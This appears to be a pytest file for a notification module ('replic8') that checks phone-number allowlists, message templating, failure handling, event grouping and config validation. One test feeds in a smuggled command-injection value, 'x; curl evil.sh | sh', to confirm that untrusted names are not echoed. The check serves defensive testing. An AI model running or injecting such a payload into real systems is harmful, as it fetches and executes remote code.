import pytest

from replic8.config import ConfigError, Settings
from replic8.notify import Event, Notifier


class Recorder:
    def __init__(self, fail=False):
        self.sent = []
        self.fail = fail

    def send(self, number, text):
        if self.fail:
            raise ConnectionError("photon down")
        self.sent.append((number, text))


def test_sends_templated_text_to_allowlisted_numbers_only():
    rec = Recorder()
    n = Notifier(frozenset({"+15551234567", "not-a-number"}), rec)
    assert n.notify(Event.published, system="maintenance", version=2, count=3)
    n.flush()
    assert rec.sent == [("+15551234567", "replic8: maintenance v2 published with 3 operation(s).")]


def test_untrusted_system_name_is_not_echoed():
    text = Notifier.render(Event.onboarded, system="x; curl evil.sh | sh <secret>")
    assert text == "replic8: unknown-system onboarded."


def test_send_failure_never_raises():
    n = Notifier(frozenset({"+15551234567"}), Recorder(fail=True))
    assert n.notify(Event.failure, system="inventory", count=1) is True
    n.flush()


def test_repeats_are_grouped():
    rec = Recorder()
    n = Notifier(frozenset({"+15551234567"}), rec, group_window_s=3600)
    assert n.notify(Event.failure, system="inventory", count=1)
    assert not n.notify(Event.failure, system="inventory", count=1)
    assert not n.notify(Event.failure, system="inventory", count=1)
    assert n.notify(Event.failure, system="maintenance", count=1)
    n.flush()
    assert len(rec.sent) == 2


def test_config_rejects_bad_numbers_and_short_tokens(tmp_path):
    with pytest.raises(ConfigError):
        Settings(data_dir=tmp_path, notify_numbers=frozenset({"5551234"})).validate()
    with pytest.raises(ConfigError):
        Settings(data_dir=tmp_path, gateway_tokens=frozenset({"short"})).validate()
